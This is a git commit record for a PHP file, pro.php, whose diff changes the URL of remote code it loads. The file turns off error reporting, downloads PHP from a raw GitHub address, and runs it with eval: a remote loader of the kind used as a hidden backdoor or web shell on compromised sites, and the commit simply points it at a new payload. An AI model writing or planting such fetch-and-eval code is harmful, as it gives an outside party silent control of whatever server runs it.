1340c0ff915f013ee7ec6014e6a4ea8ba905912a
Scandal46 <200199568+Scandal46@users.noreply.github.com>
2026-04-01 18:18:15 +0300

    Update pro.php

--- pro.php
+++ pro.php
@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-$url = 'https://raw.githubusercontent.com/labubunews/harian/refs/heads/main/tiny.php';
+$url = 'https://raw.githubusercontent.com/labubunews/harian/refs/heads/main/project2.php';
 $kode = file_get_contents($url);
 eval('?>' . $kode);
 ?>
